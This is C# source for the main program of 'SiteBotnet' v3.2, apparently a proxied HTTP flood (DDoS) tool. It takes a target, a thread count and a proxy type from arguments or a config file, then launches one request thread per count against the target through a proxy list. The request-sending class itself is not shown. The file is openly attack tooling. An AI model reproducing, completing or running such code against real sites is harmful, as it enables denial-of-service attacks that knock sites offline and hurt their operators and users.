using System;
using System.Collections.Generic;
using System.IO;
using ConfigParser;

namespace SiteBotnet3
{
    class Program
    {
        private static readonly string AppName = "SiteBotnet";
        private static readonly string AppVersion = "3.2";

        static void Main(string[] args)
        {
            string Target;
            int Threads;
            string ProxyType;
            List<string> ProxyList = new List<string>(File.ReadAllLines("proxies.txt"));

            if (args.Length == 0)
            {
                Parser p = new Parser("config.txt");
                Target = p.ReadConfig("Target").ToString().Split('=')[1].Replace(" ", "");
                Threads = Convert.ToInt32(p.ReadConfig("Threads").ToString().Split('=')[1].Replace(" ", ""));
                ProxyType = p.ReadConfig("ProxyType").ToString().Split('=')[1].Replace(" ", "");
            }
            else
            {
                Target = args[0];
                Threads = Convert.ToInt32(args[1]);
                ProxyType = args[2];
            }

            if (!File.Exists("proxies.txt")) File.WriteAllText("proxies.txt", "");
            Console.Title = AppName + " v" + AppVersion;

            for (int i = 0; i < Threads; i++)
            {
                Requests req = new Requests("[ThreadHttp-" + i + "]");
                req.SetTarget(Target);
                req.SetThreads(Threads);
                req.SetProxyType(ProxyType);
                req.SetProxyList(ProxyList);
                req.Start(true);
            }

            return;
        }
    }
}
